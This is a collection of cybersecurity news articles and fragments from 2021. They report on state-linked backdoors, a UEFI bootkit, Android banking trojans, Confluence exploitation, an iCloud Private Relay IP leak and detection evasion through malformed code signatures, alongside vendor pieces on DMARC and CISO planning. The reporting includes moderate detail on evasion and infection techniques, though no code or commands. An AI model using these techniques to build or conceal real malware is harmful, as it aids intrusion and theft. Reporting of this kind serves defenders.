for end-users, vendors, and investors. In July, Microsoft announced its acquisition of another market player RiskIQ for more than $500 million, while Mandiant has recently absorbed Intrigue, an ASM startup, known for its open-sourced version. \nImmuniWeb promises in its press release “many more exciting features soon“, so we will keep an eye on their ongoing efforts and awesome tools they share with the cybersecurity community. To prevent your cloud data from being exposed on the Internet, consider implementing CIS Benchmarks for Cloud and then run ImmuniWeb free cloud security test to validate your security controls. \n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Wednesday disclosed a previously undocumented backdoor likely designed and developed by the Nobelium advanced persistent threat (APT) behind last year’s SolarWinds supply chain attack, joining the threat actor’s ever-expanding arsenal of hacking tools.\nMoscow-headquartered firm Kaspersky codenamed the malware “Tomiris,“ calling out its similarities to another second-stage malware used during the campaign, SUNSHUTTLE (aka GoldMax), targeting the IT management software provider’s Orion platform. Nobelium is also known by the monikers UNC2452, SolarStorm, StellarParticle, Dark Halo, and Iron Ritual.\n\n“While supply-chain attacks were already a documented attack vector leveraged by a number of APT actors, this specific campaign stood out due to the extreme carefulness of the attackers and the high-profile nature of their victims,“ Kaspersky researchers said. “Evidence gathered so far indicates that Dark Halo spent six months inside Orion IT’s networks to perfect their attack and make sure that their tampering of the build chain wouldn’t cause any adverse effects.“\nMicrosoft, which detailed SUNSHUTTLE in March 2021, described the strain as a Golang-based malware that acts as a command-and-control backdoor, establishing a secure connection with an attacker-controlled server to fetch and execute arbitrary commands on the compromised machine as well as exfiltrate files from the system to the server.\n\nThe new Tomiris backdoor, found by Kaspersky in June this year from samples dating back to February, is also written in Go and deployed via a successful DNS hijacking attack during which targets attempting to access the login page of a corporate email service were redirected to a fraudulent domain set up with a lookalike interface designed to trick the visitors into downloading the malware under the guise of a security update.\nThe attacks are believed to have been mounted against several government organizations in an unnamed CIS member state.\n“The main purpose of the backdoor was to establish a foothold in the attacked system and to download other malicious components,“ the researchers said, in addition to finding a number of similarities ranging from the encryption scheme to the same spelling mistakes that collectively hint at the “possibility of common authorship or shared development practices.“\n\nThis is not the first time overlaps have been discovered between different tools put to use by the threat actor. Earlier this year, Kaspersky’s analysis of Sunburst revealed a number of shared features between the malware and Kazuar, a .NET-based backdoor attributed to the Turla group. Interestingly, the cybersecurity company said it detected Tomiris in networks where other machines were infected with Kazuar, adding weight to prospects that the three malware families could be linked to each other.\nHaving said that, the researchers pointed out it could also be a case of a false flag attack, wherein threat actors deliberately reproduce the tactics and techniques adopted by a known adversary in an attempt to mislead attribution.\nThe revelation comes days after Microsoft took the wraps of a passive and highly targeted implant dubbed FoggyWeb that was employed by the Nobelium group to deliver additional payloads and steal sensitive information from Active Directory Federation Services (AD FS) servers.\n\n\nFound this article interesting?

Kremlin Spokesman Dmitry Peskov said the government was aware of the arrest but that it had no additional details about the case, Russian state news agency TASS reported.\nThe cybersecurity company relocated to Singapore in late 2018 as part of its attempts to distance itself from any ties to the Russian government. It’s worth noting that the U.S. Department of Homeland Security banned Kaspersky products from all government departments on September 13 2017, alleging that the company had worked on secret projects with Russia’s Federal Security Service (FSB).\n\nGroup-IB is known for its assistance in a number of law enforcement operations spanning Europe, often collaborating agencies such as Europol and Interpol on investigations that have led to the arrest of several organized cybercrime groups in recent years, including Fraud Family, Dr HeX, and three Nigerian nationals suspected of perpetrating business email compromise (BEC) scams.\nIf convicted of treason, Sachkov could be punishable by up to 20 years in prison.\n\n\nFound this article interesting?

Mariana Trench also marks the third such service the company has open-sourced after Zoncolan and Pysa, each of which target Hack and Python programming languages, respectively.\n\nThe development also follows similar moves from Microsoft-owned GitHub, which acquired Semmle and launched a Security Lab in 2019 with an aim to secure open-source software, in addition to making semantic code analysis tools such as CodeQL freely available to spot vulnerabilities in publicly available code.\n“There are differences in patching and ensuring the adoption of code updates between mobile and web applications, so they require different approaches,“ the company said.\n“While server-side code can be updated almost instantaneously for web apps, mitigating a security bug in an Android application relies on each user updating the application on the device they own in a timely way.

One of the apps, Handy Translator Pro, amassed as much as 500,000 downloads.\n“While typical premium service scams take advantage of phishing techniques, this specific global scam has hidden behind malicious Android applications acting as Trojans, allowing it to take advantage of user interactions for increased spread and infection,“ Zimperium researchers Aazim Yaswant and Nipun Gupta said in a report shared with The Hacker News.\n“These malicious Android applications appear harmless when looking at the store description and requested permissions, but this false sense of confidence changes when users get charged month over month for the premium service they get subscribed to without their knowledge and consent.“\n\nLike other banking trojans, GriftHorse does not exploit flaws in the Android operating system, but rather socially engineers users into subscribing their phone numbers to premium SMS services upon downloading the apps.\n\nFollowing a successful infection, the victims are bombarded with deceptive alerts promising a free “GIFT“ that, when clicked, redirect them to a geo-specific webpage to submit their phone numbers for verification. “But in reality, they are submitting their phone number to a premium SMS service that would start charging their phone bill over €30 per month,“ the researchers said.\nIn building a stable cash flow of illicit funds, the GriftHorse campaign not only managed to fly under the radar and avoid antivirus detection, but also has generated millions in recurring revenue each month, potentially surpassing hundreds of millions in the total amount plundered from these victims, the researchers noted.\nFollowing responsible disclosure to Google, the apps have been purged from the Play Store. But they continue to be available on untrusted third-party app repositories, once again underscoring the risks associated with sideloading arbitrary applications and how they can emerge as an intrusion route for malware.\n“Overall, GriftHorse Android Trojan takes advantage of small screens, local trust, and misinformation to trick users into downloading and installing these Android Trojans, as well frustration or curiosity when accepting the fake free prize spammed into their notification screens,“ Yaswant and Gupta concluded.\n\n\nFound this article interesting?

{'title': '[eBook] Your First 90 Days as CISO — 9 Steps to Success',
'text': 'Chief Information Security Officers (CISOs) are an essential pillar of an organization’s defense, and they must account for a lot. Especially for new CISOs, this can be a daunting task. The first 90 days for a new CISO are crucial in setting up their security team, so there is little time to waste, and much to accomplish. \nFortunately. A new guide by XDR provider Cynet (download here) looks to give new and veteran CISOs a durable foundation to build a successful security organization. The challenges faced by new CISOs aren’t just logistical.\nThey include securing their environment from both known and unknown threats, dealing with stakeholders with unique needs and demands, and interfacing with management to show the value of strong security. \nTherefore, having clearly defined steps planned out can help CISOs seize the opportunity for change and implement security capabilities that allow organizations to grow and prosper.\nSecurity leaders can also leverage the willingness of organizations to undergo digital transformations to deploy smarter and more adaptive defenses. This is critical, as a good security team can enhance an organization’s ability to scale and innovate. The question is where to start. \n9 steps for new CISOs \nThe eBook explains how new CISOs should tackle their first 90 days to ensure that each passing week builds on the last, and lets security leaders understand both their current reality, and what they need to improve. Before building a security stack and organization, new CISOs need to comprehend the status quo, what works, and what needs to be upgraded or replaced. \nThese are the nine steps to new CISO success, according to the guide:\n Understanding business risks – The first two weeks of a new security leader’s new job should be spent not doing but learning. New CISOs should familiarize themselves with their organization, how it operates, its security strategy, and how it interacts with the market. It should also be a time to meet with other executives and stakeholders to understand their needs. Comprehending organizational processes and developing a team – Next, it’s time to look at processes and teams, and how they interact. Before implementing new protocols, CISOs and security leaders should know the processes already in place and how they work or don’t work for the organization. Building a strategy – Then, it’s time to start building a new security strategy that meets the organization’s business strategy, goals, and objectives, as well as the staff’s career goals and objectives. This will include thinking about automation and how cyber-risks are detected and met, as well as how to test your defenses. Finalizing strategies and implementation – With a strategy built, it’s time to put rubber to road and get going. Before finalizing your strategy, it’s important to get critical feedback from other stakeholders before bringing a final plan to the board and the executive committee. With final approval, it’s time to start building tactics and plan how to implement the new strategy. Becoming agile – Once strategies are put into practice, security teams can focus on finding ways to become more responsive, more adaptable, and agile enough to meet any challenge. This includes finding the right project management tools and methods. Measuring and reporting – Now, it’s time to ensure that the plans that were implemented are properly working. Once things are in place, it’s time to begin regular measuring and reporting cycles to show both the security team and the executive committee that the strategy is working. Pen testing – This is a critical step and should be an important evaluation of a strategy’s effectiveness. Any good plan should always include rigorous testing to help teams find places where defenses are not working or vulnerabilities that might not have appeared on paper but do in practice. Building a ZTA plan – Now, it’s time to do away with outdated identity and access management (IAM) paradigms and upgrade to multi-factor authentication (MFA). This also includes upgrading SaaS application security posture, as well as network defenses that can prevent common attacks. Evaluate SaaS vendors – Finally, and with the goal of using SaaS applications wherever possible, a new CISO must carefully consider existing vendors to find a solution that can cover as many services as possible without requiring complex and potentially risky security stacks. \nYou can learn more about how CISOs can get started successfully here. \n\n\nFound this article interesting?

'text': 'Two newly discovered malicious Android applications on Google Play Store have been used to target users of Brazil’s instant payment ecosystem in a likely attempt to lure victims into fraudulently transferring their entire account balances into another bank account under cybercriminals’ control.\n“The attackers distributed two different variants of banking malware, named PixStealer and MalRhino, through two separate malicious applications […] to carry out their attacks,“ Check Point Research said in an analysis shared with The Hacker News. “Both malicious applications were designed to steal money of victims through user interaction and the original PIX application.“\nThe two apps in question, which were uncovered in April 2021, have since been removed from the app store.\n\nLaunched in November 2020 by the Central Bank of Brazil, the country’s monetary authority, Pix is a state-owned payments platform that enables consumers and companies to make money transfers from their bank accounts without requiring debit or credit cards.\nPixStealer, which was found distributed on Google Play as a fake PagBank Cashback service app, is designed to empty a victim’s funds to an actor-controlled account, while MalRhino — masquerading as a mobile token app for Brazil’s Inter bank — comes with advanced features necessary to collect the list of installed apps and retrieve PIN for specific banks.\n\n“When a user opens their PIX bank application, Pixstealer shows the victim an overlay window, where the user can’t see the attacker’s moves,“ the researchers said. “Behind the overlay window, the attacker retrieves the available amount of money and transfers the money, often the entire account balance, to another account.“\nWhat unites PixStealer and MalRhino is that both the apps abuse Android’s accessibility service to perform malicious actions on the compromised devices, making them the latest addition to a long list of mobile malware that leverages the permission to perpetrate data theft.\n\nSpecifically, the fake overlay hijacks the entire screen to display a message “Synchronizing your access... Do not turn off your mobile screen“ when, in background, the malware searches for the “Transfer“ button to perform the transaction with the help of accessibility APIs.\nThe MalRhino variant also stands out for its use of Mozilla’s Java-based Rhino JS framework to run JavaScript commands inside targeted banking applications, but not before convincing the user to turn on accessibility services.\n“This technique is not commonly used on mobile malware and shows how malicious actors are getting innovative to avoid detection and get inside Google Play,“ the researchers said. “With the increasing abuse of the Accessibility Service by mobile banking malware, users should be wary of enabling the relevant permissions even in the applications distributed via known app stores such as Google Play.“\n\n\nFound this article interesting?

{'title': 'New FinSpy Malware Variant Infects Windows Systems With UEFI Bootkit',
'text': 'Commercially developed FinFisher surveillanceware has been upgraded to infect Windows devices using a UEFI (Unified Extensible Firmware Interface) bootkit that leverages a trojanized Windows Boot Manager, marking a shift in infection vectors that allow it to elude discovery and analysis.\nDetected in the wild since 2011, FinFisher (aka FinSpy or Wingbird) is a spyware toolset for Windows, macOS, and Linux developed by Anglo-German firm Gamma International and supplied exclusively to law enforcement and intelligence agencies. But like with NSO Group’s Pegasus, the software has also been used to spy on Bahraini activists in the past allegedly and delivered as part of spear-phishing campaigns in September 2017.\n\nFinFisher is equipped to harvest user credentials, file listings, sensitive documents, record keystrokes, siphon email messages from Thunderbird, Outlook, Apple Mail, and Icedove, intercept Skype contacts, chats, calls and transferred files, and capture audio and video by gaining access to a machine’s microphone and webcam.\nWhile the tool was previously deployed through tampered installers of legitimate applications such as TeamViewer, VLC, and WinRAR that were backdoored with an obfuscated downloader, subsequent updates in 2014 enabled infections via Master Boot Record (MBR) bootkits with the goal of injecting a malicious loader in a manner that’s engineered to slip past security tools.\nThe latest feature to be added is the ability to deploy a UEFI bootkit to load FinSpy, with new samples exhibiting properties that replaced the Windows UEFI boot loader with a malicious variant as well as boasting of four layers of obfuscation and other detection-evasion methods to slow down reverse engineering and analysis.\n“This way of infection allowed the attackers to install a bootkit without the need to bypass firmware security checks,“ Kaspersky’s Global Research and Analysis Team (GReAT) said in a technical deep dive following an eight-month-long investigation. “UEFI infections are very rare and generally hard to execute, they stand out due to their evasiveness and persistence.“\n\nUEFI is a firmware interface and an improvement over basic input/output system (BIOS) with support for Secure Boot, which ensures the integrity of the operating system to ascertain no malware has interfered with the boot process. But because UEFI facilitates the loading of the operating system itself, bootkit infections are not only resistant to OS reinstallation or replacement of the hard drive but are also inconspicuous to security solutions running within the operating system.\nThis enables threat actors to have control over the boot process, achieve persistence, and bypass all security defences. “While in this case the attackers did not infect the UEFI firmware itself, but its next boot stage, the attack was particularly stealthy, as the malicious module was installed on a separate partition and could control the boot process of the infected machine,“ the researchers added.\n\n\nFound this article interesting?

'text': 'Opportunistic threat actors have been found actively exploiting a recently disclosed critical security flaw in Atlassian Confluence deployments across Windows and Linux to deploy web shells that result in the execution of crypto miners on compromised systems.\nTracked as CVE-2021-26084 (CVSS score: 9.8), the vulnerability concerns an OGNL (Object-Graph Navigation Language) injection flaw that could be exploited to achieve arbitrary code execution on a Confluence Server or Data Center instance.\n“A remote attacker can exploit this vulnerability by sending a crafted HTTP request containing a malicious parameter to a vulnerable server,“ researchers from Trend Micro noted in a technical write-up detailing the weakness. “Successful exploitation can result in arbitrary code execution in the security context of the affected server.“\n\nThe vulnerability, which resides in the Webwork module of Atlassian Confluence Server and Data Center, stems from an insufficient validation of user-supplied input, causing the parser to evaluate rogue commands injected within the OGNL expressions.\nThe in-the-wild attacks come after the U.S. Cyber Command warned of mass exploitation attempts following the vulnerability’s public disclosure in late August this year.\n\nIn one such attack observed by Trend Micro, z0Miner, a trojan and cryptojacker, was found updated to leverage the remote code execution (RCE) flaw to distribute next-stage payloads that act as a channel to maintain persistence and deploy cryptocurrency mining software on the machines. Imperva, in an independent analysis, corroborated the findings, uncovering similar intrusion attempts that were aimed at running the XMRig cryptocurrency miner and other post-exploitation scripts.\n\nAlso detected by Imperva, Juniper, and Lacework is exploitation activity conducted by Muhstik, a China-linked botnet known for its wormlike self-propagating capability to infect Linux servers and IoT devices since at least 2018.\n\nFurthermore, Palo Alto Networks’ Unit 42 threat intelligence team said it identified and prevented attacks that were orchestrated to upload its customers’ password files as well as download malware-laced scripts that dropped a miner and even open an interactive reverse shell on the machine.\n“As is often the case with RCE vulnerabilities, attackers will rush and exploit affected systems for their own gain,“ Imperva researchers said. “RCE vulnerabilities can easily allow threat actors to exploit affected systems for easy monetary gain by installing cryptocurrency miners and masking their activity, thus abusing the processing resources of the target.“\n\n\nFound this article interesting?

'text': 'A new advanced trojan sold on Russian-speaking underground forums comes with capabilities to steal users’ accounts on popular online video game distribution services, including Steam, Epic Games Store, and EA Origin, underscoring a growing threat to the lucrative gaming market.\nCybersecurity firm Kaspersky, which coined the malware “BloodyStealer,“ said it first detected the malicious tool in March 2021 as being advertised for sale at an attractive price of 700 RUB (less than $10) for one month or $40 for a lifetime subscription. Attacks using Bloody Stealer have been uncovered so far in Europe, Latin America, and the Asia-Pacific region.\n\n“BloodyStealer is a Trojan-stealer capable of gathering and exfiltrating various types of data, for cookies, passwords, forms, banking cards from browsers, screenshots, log-in memory, and sessions from various applications,“ the company said. The information harvested from gaming apps, such as Bethesda, Epic Games, GOG, Origin, Steam, and VimeWorld, is exfiltrated to a remote server, from where it’s likely to be monetized on darknet platforms or Telegram channels that are dedicated to selling access to online gaming accounts.\n\nThe malware is not only aimed at VIP members of underground forums, but also stands out for a barrage of anti-analysis methods it uses to thwart detection and intentionally complicate reverse engineering. Furthermore, infection chains involving BloodyStealer are also noteworthy for the fact that threat actors who had purchased a license to the product used the stealer in conjunction with other malware campaigns.\n\nKaspersky did not reveal the attack vectors used to stage the incursions, but it’s typical of adversaries to target users looking to download games from fraudulent sites or through email and chat messages containing links to external rogue sites that trick gamers into entering their account information.\n“BloodyStealer is a prime example of an advanced tool used by cybercriminals to penetrate the gaming market,“ the researchers said. “With its interesting capabilities, such as extraction of browser passwords, cookies, and environment information as well as grabbing information related to online gaming platforms, BloodyStealer provides value in terms of data that can be stolen from gamers and later sold on the darknet.“\n\n\nFound this article interesting?

'text': 'Microsoft on Monday revealed new malware deployed by the hacking group behind the SolarWinds supply chain attack last December to deliver additional payloads and steal sensitive information from Active Directory Federation Services (AD FS) servers.\nThe tech giant’s Threat Intelligence Center (MSTIC) codenamed the “passive and highly targeted backdoor“ FoggyWeb, making it the threat actor tracked as Nobelium’s latest tool in a long list of cyber weaponry such as Sunburst, Sunspot, Raindrop, Teardrop, GoldMax, GoldFinder, Sibot, Flipflop, NativeZone, EnvyScout, BoomBox, and VaporRage.\n\n“Once Nobelium obtains credentials and successfully compromises a server, the actor relies on that access to maintain persistence and deepen its infiltration using sophisticated malware and tools,“ MSTIC researchers said. “Nobelium uses FoggyWeb to remotely exfiltrate the configuration database of compromised AD FS servers, decrypted token-signing certificate, and token-decryption certificate, as well as to download and execute additional components.“\n\nMicrosoft said it observed FoggyWeb in the wild as early as April 2021, describing the implant as a “malicious memory-resident DLL.“\nNobelium is the moniker assigned by the company to the nation-state hacking group widely known as APT29, The Dukes, or Cozy Bear — an advanced persistent threat that has been attributed to Russia’s Foreign Intelligence Service (SVR) — and believed to have been behind the wide-ranging attack targeting SolarWinds that came to light in December 2020. The adversary behind this campaign is also being monitored under a variety of codenames like UNC2452 (FireEye), SolarStorm (Unit 42), StellarParticle (CrowdStrike), Dark Halo (Volexity), and Iron Ritual (Secureworks). \n\nFoggyWeb, installed using a loader by exploiting a technique called DLL search order hijacking, is capable of transmitting sensitive information from a compromised AD FS server as well as receive and execute additional malicious payloads retrieved from a remote attacker-controlled server. It’s also engineered to monitor all incoming HTTP GET and POST requests sent to the server from the intranet (or internet) and intercept HTTP requests that are of interest to the actor. \n“Protecting AD FS servers is key to mitigating Nobelium attacks,“ the researchers said. “Detecting and blocking malware, attacker activity, and other malicious artifacts on AD FS servers can break critical steps in known Nobelium attack chains. Customers should review their AD FS Server configuration and implement changes to secure these systems from attacks.“\n\n\nFound this article interesting?

'text': 'State-sponsored hackers affiliated with Russia are behind a new series of intrusions using a previously undocumented implant to compromise systems in the U.S., Germany, and Afghanistan.\nCisco Talos attributed the attacks to the Turla advanced persistent threat (APT) group, coining the malware “TinyTurla“ for its limited functionality and efficient coding style that allows it to go undetected. Attacks incorporating the backdoor are believed to have occurred since 2020.\n\n“This simple backdoor is likely used as a second-chance backdoor to maintain access to the system, even if the primary malware is removed,“ the researchers said. “It could also be used as a second-stage dropper to infect the system with additional malware.“ Furthermore, TinyTurla can upload and execute files or exfiltrate sensitive data from the infected machine to a remote server, while also polling the command-and-control (C2) station every five seconds for any new commands.\nAlso known by the monikers Snake, Venomous Bear, Uroburos, and Iron Hunter, the Russian-sponsored espionage outfit is notorious for its cyber offensives targeting government entities and embassies spanning across the U.S., Europe, and Eastern Bloc nations. The TinyTurla campaign involves the use of a .BAT file to deploy the malware, but the exact intrusion route remains unclear as yet.\nThe novel backdoor — which camouflages as an innocuous but fake Microsoft Windows Time Service (“w32time.dll“) to fly under the radar — is orchestrated to register itself and establish communications with an attacker-controlled server to receive further instructions that range from downloading and executing arbitrary processes to uploading the results of the commands back to the server.\n\nTinyTurla’s links to Turla come from overlaps in the modus operandi, which has been previously identified as the same infrastructure used by the group in other campaigns in the past. But the attacks also stand in stark contrast to the outfit’s historical covert campaigns, which have included compromised web servers and hijacked satellite connections for their C2 infrastructure, not to mention evasive malware like Crutch and Kazuar.\n\n“This is a good example of how easy malicious services can be overlooked on today’s systems that are clouded by the myriad of legit services running in the background at all times,“ the researchers noted.\n“It’s more important now than ever to have a multi-layered security architecture in place to detect these kinds of attacks. It isn’t unlikely that the adversaries will manage to bypass one or the other security measures, but it is much harder for them to bypass all of them.“\n\n\nFound this article interesting?

'text': 'The operators behind the BlackRock mobile malware have surfaced back with a new Android banking trojan called ERMAC that targets Poland and has its roots in the infamous Cerberus malware, according to the latest research.\n“The new trojan already has active distribution campaigns and is targeting 378 banking and wallet apps with overlays,“ ThreatFabric’s CEO Cengiz Han Sahin said in an emailed statement. First campaigns involving ERMAC are believed to have begun in late August under the guise of the Google Chrome app.\nSince then, the attacks have expanded to include a range of apps such as banking, media players, delivery services, government applications, and antivirus solutions like McAfee.\n\nAlmost fully based on the notorious banking trojan Cerberus, the Dutch cybersecurity firm’s findings come from forum posts made by an actor named DukeEugene last month on August 17, inviting prospective customers to “rent a new android botnet with wide functionality to a narrow circle of people“ for $3,000 a month.\nDukeEugene is also known as the actor behind the BlackRock campaign that came to light in July 2020. Featuring an array of data theft capabilities, the infostealer and keylogger originate from another banking strain called Xerxes — which itself is a strain of the LokiBot Android banking Trojan — with the malware’s source code made public by its author around May 2019.\n\nCerberus, in September 2020, had its own source code released as a free remote access trojan (RAT) on underground hacking forums following a failed auction that sought $100,000 for the developer.\n\nThreatFabric also highlighted the cessation of fresh BlackRock samples since the emergence of ERMAC, raising the possibility that “DukeEugene switched from using BlackRock in its operations to ERMAC.“ Besides sharing similarities with Cerberus, the freshly discovered strain is notable for its use of obfuscation techniques and Blowfish encryption scheme to communicate with the command-and-control server.\n\nERMAC, like its progenitor and other banking malware, is designed to steal contact information, text messages, open arbitrary applications, and trigger overlay attacks against a multitude of financial apps to swipe login credentials. In addition, it has developed new features that allow the malicious software to clear the cache of a specific application and steal accounts stored on the device.\n“The story of ERMAC shows one more time how malware source code leaks can lead not only to slow evaporation of the malware family but also bring new threats/actors to the threat landscape,“ the researchers said. “Although it lacks some powerful features like RAT, it remains a threat for mobile banking users and financial institutions all over the world.“\n\n\nFound this article interesting?

{'title': 'How Does DMARC Prevent Phishing?',
'text': 'DMARC is a global standard for email authentication. It allows senders to verify that the email really comes from whom it claims to come from. This helps curb spam and phishing attacks, which are among the most prevalent cybercrimes of today. Gmail, Yahoo, and many other large email providers have implemented DMARC and praised its benefits in recent years.\nIf your company’s domain name is bankofamerica.com, you do not want a cyber attacker to be able to send emails under that domain. This puts your brand reputation at risk and could potentially spread financial malware. The DMARC standard prevents this by checking whether emails are sent from an expected IP address or domain. It specifies how domains can be contacted if there are authentication or migration issues and provides forensic information so senders can monitor email traffic and quarantine suspicious emails.\nWhat is a Phishing Attack?\nPhishing is an attempt by cybercriminals to trick victims into giving away sensitive information such as credit card numbers and passwords via fake websites and bogus emails. Phishing is a form of social engineering. It is also one of the most common methods cybercriminals use to infiltrate businesses and compromise their sensitive data.\nDomain spoofing is a precursor to most phishing attacks used to spoof emails. In this process, an attacker spoofs a legitimate email address or domain name and sends fake emails containing phishing links and ransomware to the company’s clientele. The unsuspecting recipient believes the spoofed email is from a company they know and trust and ends up sharing their corporate or banking information with the attacker, thereby getting phished. This affects the reputation of businesses and leads to the loss of prospects and customers.\nDMARC can help minimize direct-domain spoofing attempts, which indirectly also cuts down on phishing attacks perpetrated via spoofed company domains. \nHow to Identify a Phishing Email Sent from a Spoofed Domain?\nSpoofing is not a new threat. Email spoofing is a deceptive tactic used by attackers to manipulate both the identity of the sender of an email message and the apparent origin of that message. Most spoofing attacks either use forged header information or create a fake sender email address.\nRecipients can detect phishing emails sent from a spoofed company domain by examining the email header information, such as the “from:“ address and “return-path“ address, and verifying that they match. While the email “From“ address is a visible header, the “return-path“ address is usually not immediately visible, and upon inspecting, it can help receivers detect the original identity of the attacker.\nFor example: \nA phishing email sent from a spoofed domain will most likely have its From: address as: marketing@company.com, which looks authentic to the untrained eye of the receiver who is familiar with the services of the said company. However, on inspecting the Return-path address, the receiver will realize that the email is not from where the sender claims it to be, \nDomain owners can also detect and identify domain spoofing and impersonation attempts by deploying a DMARC report analyzer at their organization. PowerDMARC’s DMARC report analyzer allows domain owners to: \nReceive and read their DMARC reports on a well-organized dashboard, across a single pane of glass, instead of having to read individual reports sent to them on their email or web server.\nOrganizations’ DMARC data is organized and assorted into convenient viewing formats such as per result, per sending source, per country, per organization, detailed stats, and geolocation. \nDifficult-to-read XML files containing DMARC aggregate data is parsed into simpler and easily readable documents.\nDomain owners can export the data in the form of scheduled PDF reports to share with employees for awareness and inspection.\nForensic information on malicious sending sources providing granular details on the origin and location of these forged addresses so they can be easily reported and taken down.\nHow to Reduce Email Phishing with DMARC? \n\nA DMARC policy mode of p=reject can be an effective solution in combating a wide range of cyberattacks, including direct-domain spoofing and email phishing. \nDMARC helps verify the origin of emails and block out fake emails from being received and opened. However, in reality, a limited number of businesses have actually adopted the protocol, and an even smaller population has implemented it correctly. \nPowerDMARC’s DMARC analyzer aids organizations in achieving DMARC enforcement the right way! While a DMARC reject policy, when taken lightly, can lead to the loss of legitimate emails, hosted DMARC services ensure improvement in email deliverability and reduced email phishing attacks over a period of time.\nPowerDMARC’s DMARC analyzer helps organizations safely upgrade their DMARC policy from monitoring only to p=reject, so they can enjoy the benefits of email authentication without worrying about the consequences.\nAdditionally, when you are on p=reject, you can avail of the benefits of visual identification with BIMI, by attaching your unique brand logo to specific outgoing emails that reach your clients. \nWorried about constant spoofing and phishing attacks and want to improve your domain’s email security?

'text': 'Cybersecurity researchers have charted the evolution of Jupyter, a .NET infostealer known for singling out healthcare and education sectors, which make it exceptional at defeating most endpoint security scanning solutions.\nThe new delivery chain, spotted by Morphisec on September 8, underscores that the malware has not just continued to remain active but also showcases “how threat actors continue to develop their attacks to become more efficient and evasive.“ The Israeli company said it’s currently investigating the scale and scope of the attacks.\n\nFirst documented in November 2020, Jupyter (aka Solarmarker) is likely Russian in origin and primarily targets Chromium, Firefox, and Chrome browser data, with additional capabilities that allow for full backdoor functionality, including features to siphon information and upload the details to a remote server and download and execute further payloads. Forensic evidence gathered by Morphisec shows that multiple versions of Jupyter began emerging starting May 2020.\nIn August 2021, Cisco Talos attributed the intrusions to a “fairly sophisticated actor largely focused on credential and residual information theft.“ Cybersecurity firm CrowdStrike, earlier this February, described the malware as packing a multi-stage, heavily obfuscated PowerShell loader, which leads to the execution of a .NET compiled backdoor.\n\nWhile previous attacks incorporated legitimate binaries of well-known software such as Docx2Rtf and Expert PDF, the latest delivery chain puts to use another PDF application called Nitro Pro. The attacks start with a deployment of an MSI installer payload that’s over 100MB in size, allowing them to bypass anti-malware engines, and obfuscated using a third-party application packaging wizard called Advanced Installer.\nRunning the MSI payload leads to the execution of a PowerShell loader embedded within a legitimate binary of Nitro Pro 13, two variants of which have been observed signed with a valid certificate belonging to an actual business in Poland, suggesting a possible certificate impersonation or theft. The loader, in the final-stage, decodes and runs the in-memory Jupyter .NET module.\n“The evolution of the Jupyter infostealer/backdoor from when we first identified it in 2020 proves the truth of the statement that threat actors are always innovating,“ Morphisec researcher Nadav Lorber said. “That this attack continues to have low or no detections on VirusTotal further indicates the facility with which threat actors evade detection-based solutions.“\n\n\nFound this article interesting?

{'title': 'Apple’s New iCloud Private Relay Service Leaks Users’ Real IP Addresses',
'text': 'A new as-yet unpatched weakness in Apple’s iCloud Private Relay feature could be circumvented to leak users’ true IP addresses from iOS devices running the latest version of the operating system.\nIntroduced as a beta with iOS 15, which was officially released this week, iCloud Private Relay aims to improve anonymity on the web by employing a dual-hop architecture that effectively shields users’ IP address, location, and DNS requests from websites and network service providers.\nIt achieves this by routing users’ internet traffic on the Safari browser through two proxies in order to mask who’s browsing and where that data is coming from in what could be viewed as a simplified version of Tor. \n\nHowever, the feature is available only to iCloud+ subscribers running iOS 15 or macOS 12 Monterey and above.\n“If you read the IP address from an HTTP request received by your server, you’ll get the IP address of the egress proxy,“ FingerprintJS researcher Sergey Mostsevenko said. “Nevertheless, you can get the real client’s IP through WebRTC.“\nWebRTC, short for Web Real-Time Communication, is an open-source initiative aimed at providing web browsers and mobile applications with real-time communication via APIs that enable peer-to-peer audio and video communication without the need for installing dedicated plugins or apps.\nThis real-time media exchange between two endpoints is established through a discovery and negotiation process called signaling that involves the use of a framework named Interactive Connectivity Establishment (ICE), which details the methods (aka candidates) that can be used by the two peers to find and establish a connection with one another, irrespective of the network topology.\nThe vulnerability unearthed by FingerprintJS has to do with a specific candidate dubbed “Server Reflexive Candidate“ that’s generated by a STUN server when data from the endpoint needs to be transmitted around a NAT (Network Address Translator). STUN — i.e., Session Traversal Utilities for NAT — is a tool used to retrieve the public IP address and port number of a networked computer situated behind a NAT.\n\nSpecifically, the flaw arises from the fact that such STUN requests aren’t proxied through iCloud Private Relay, resulting in a scenario where the real IP address of the client is exposed when the ICE candidates are exchanged during the signaling process. “De-anonymizing you then becomes a matter of parsing your real IP address from the ICE candidates — something easily accomplished with a web application,“ Mostsevenko said.\nFingerprintJS said it alerted Apple to the problem, with the iPhone maker already rolling out a fix in its latest beta version of macOS Monterey. However, the leak has remained unpatched when using iCloud Private Relay on iOS 15.\nIf anything, the revelation is yet another indication that iCloud Private Relay can never be a replacement for VPNs, and users who are concerned about the visibility of their IP addresses should use a real VPN or browse the internet over the Tor network, and completely disable JavaScript from Safari to turn off WebRTC-related features.\n\n\nFound this article interesting?

{'title': 'Google Warns of a New Way Hackers Can Make Malware Undetectable on Windows',
'text': 'Cybersecurity researchers have disclosed a novel technique adopted by a threat actor to deliberately evade detection with the help of malformed digital signatures of its malware payloads.\n“Attackers created malformed code signatures that are treated as valid by Windows but are not able to be decoded or checked by OpenSSL code — which is used in a number of security scanning products,“ Google Threat Analysis Group’s Neel Mehta said in a write-up published on Thursday.\n\nThe new mechanism was observed to be exploited by a notorious family of unwanted software known as OpenSUpdater that’s used to download and install other suspicious programs on compromised systems. Most targets of the campaign are users located in the U.S. who are prone to downloading cracked versions of games and other grey-area software.\nThe findings come from a set of OpenSUpdater samples uploaded to VirusTotal at least since mid-August.\nWhile adversaries in the past have relied on illegally obtained digital certificates to sneak adware and other unwanted software past malware detection tools or by embedding the attack code into digitally signed, trusted software components by poisoning the software supply chain, OpenSUpdater stands out for its intentional use of malformed signature to slip through defenses.\n\nThe artifacts are signed with an invalid leaf X.509 certificate that’s edited in such a manner that the ’parameters’ element of the SignatureAlgorithm field included an End-of-Content (EOC) marker instead of a NULL tag. Although such encodings are rejected as invalid by products using OpenSSL to retrieve signature information, checks on Windows systems would permit the file to be run without any security warnings.\n\n“This is the first time TAG has observed actors using this technique to evade detection while preserving a valid digital signature on PE files,“ Mehta said.\n“Code signatures on Windows executables provide guarantees about the integrity of a signed executable, as well as information about the identity of the signer. Attackers who are able to obscure their identity in signatures without affecting the integrity of the signature can avoid detection longer and extend the lifetime of their code-signing certificates to infect more systems.“\n\n\nFound this article interesting?

